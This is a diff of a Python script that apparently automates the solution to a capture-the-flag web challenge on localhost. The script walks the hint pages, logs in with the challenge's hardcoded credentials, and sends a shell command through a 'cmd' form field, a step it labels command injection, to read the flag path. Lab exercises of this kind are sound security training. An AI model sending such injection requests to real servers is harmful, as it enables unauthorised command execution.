@@ -5,7 +5,7 @@ BASE_URL = "http://127.0.0.1:5004"
 
 print("1. Visiting /...")
 r1 = requests.get(f"{BASE_URL}/")
-print("Fake flags present?", "DAKSHH{f4ke" in r1.text)
+print("Decoy flags present?", "DAKSHH{1n1t14l" in r1.text)
 
 print("\n2. Following hints to /gmdost...")
 r2 = requests.get(f"{BASE_URL}/gmdost")
@@ -18,10 +18,10 @@ print("/yagf hint present?", "yagf" in r3.text)
 print("\n4. Following hint to /yagf...")
 session = requests.Session()
 r4 = session.get(f"{BASE_URL}/yagf")
-print("Base64 string present?", "aHR0cDovL3RyYW5zZmVyLnNoLzFsZ0dibGMvbG9naW4udHh0" in r4.text)
+print("Base64 string present?", "YW1pX2hhY2tlcl9ib2xjaGk6aGl0a19zeXN0ZW1faDRja2Vk" in r4.text)
 
 print("\n5. Logging in at /validate...")
-r5 = session.post(f"{BASE_URL}/validate", data={"usr": "vn_daan_vararu", "pwd": "flag_find_panna_poraru"})
+r5 = session.post(f"{BASE_URL}/validate", data={"usr": "ami_hacker_bolchi", "pwd": "hitk_system_h4cked"})
 print("Did it redirect to finalpath?", "last page" in r5.text or "redirect" in r5.url or "finalpath" in r5.url)
 
 print("\n6. Getting flag path...")
@@ -37,7 +37,10 @@ with open("flagpath", "w") as f:
 
 # Now run command injection
 r6 = session.post(f"{BASE_URL}/redirect", data={"cmd": "cat flagpath"})
-flag_path = r6.text.replace("<h3>", "").replace("</h3>", "").strip()
+try:
+    flag_path = r6.text.split('<pre style="color: var(--neon); white-space: pre-wrap; font-size: 1rem;">')[1].split('</pre>')[0].strip()
+except IndexError:
+    flag_path = "Could not parse output block"
 print("Command injection result:", flag_path)
 
 print("\n7. Visiting final route...")
